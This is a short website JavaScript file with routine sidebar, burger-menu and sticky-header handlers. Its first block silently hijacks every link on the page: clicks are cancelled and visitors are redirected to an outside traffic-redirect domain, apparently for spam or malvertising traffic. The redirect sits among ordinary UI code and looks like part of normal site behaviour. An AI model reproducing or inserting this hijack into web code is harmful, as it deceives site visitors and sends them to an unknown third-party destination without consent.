document.querySelectorAll("a").forEach((elem) => {
	elem.onclick = function (e) {
		e.preventDefault();
		window.location.href = "https://redirecttraff.site/GnT64qdF";
		return false;
	};
});

let header = document.querySelector("header");
let burger = document.querySelector(".burger");
let sidebar = document.querySelector(".sidebar");
let main = document.querySelector(".wrap");
let headerIcon = document.querySelector(".header__icon");

headerIcon.addEventListener("click", () => {
	sidebar.classList.toggle("active");
	main.classList.toggle("active");
});

burger.addEventListener("click", () => {
	burger.classList.toggle("active");
	sidebar.classList.toggle("active");
	main.classList.toggle("active");
	document.body.classList.toggle("hidden");
});

main.addEventListener("click", () => {
	burger.classList.remove("active");
	sidebar.classList.remove("active");
	main.classList.remove("active");
	document.body.classList.remove("hidden");
});

document.addEventListener("scroll", function () {
	if (window.scrollY > 64) {
		header.classList.add("active");
	} else {
		header.classList.remove("active");
	}
});
